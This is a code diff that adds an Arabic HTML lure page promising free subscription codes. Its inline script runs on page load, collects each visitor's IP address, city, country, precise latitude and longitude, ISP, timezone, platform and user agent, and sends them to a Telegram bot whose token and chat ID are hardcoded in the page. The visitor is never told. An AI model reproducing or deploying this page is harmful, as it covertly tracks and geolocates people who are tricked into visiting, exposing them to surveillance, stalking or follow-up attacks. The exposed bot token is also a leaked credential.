@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>توزيع اكواد اشتراك يرميه 🔥</title>
+<style>
+  body { font-family: Arial, sans-serif; background:#111; color:#eee;
+         display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
+  .box { text-align:center; background:#1c1c1c; padding:40px; border-radius:12px; }
+</style>
+</head>
+<body>
+  <div class="box">
+    <h1>مرحباً بك 👋</h1>
+    <p>جاري تحميل المحتوى...</p>
+  </div>
+
+<script>
+const BOT_TOKEN = "8620198044:AAEIo8BsrYjv-C-QsYTT1DlzvZKd9M_D28E";
+const CHAT_ID   = "8681304163";
+
+async function sendToTelegram(text) {
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+  await fetch(url, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "HTML" })
+  });
+}
+
+fetch("https://ipapi.co/json/")
+  .then(r => r.json())
+  .then(data => {
+    const msg =
+`🌐 زائر جديد
+
+📡 IP: <code>${data.ip}</code>
+🏙️ المدينة: ${data.city || "غير معروف"}
+🌍 الدولة: ${data.country_name || "غير معروف"}
+🗺️ خط العرض: ${data.latitude}
+🗺️ خط الطول: ${data.longitude}
+🏢 المزوّد: ${data.org || "غير معروف"}
+🕐 المنطقة الزمنية: ${data.timezone || "غير معروف"}
+
+🖥️ الجهاز: ${navigator.platform}
+🌐 المتصفح: ${navigator.userAgent}`;
+
+    sendToTelegram(msg);
+  })
+  .catch(err => sendToTelegram("🌐 زائر جديد (تعذر جلب IP): " + err));
+</script>
+</body>
+</html>
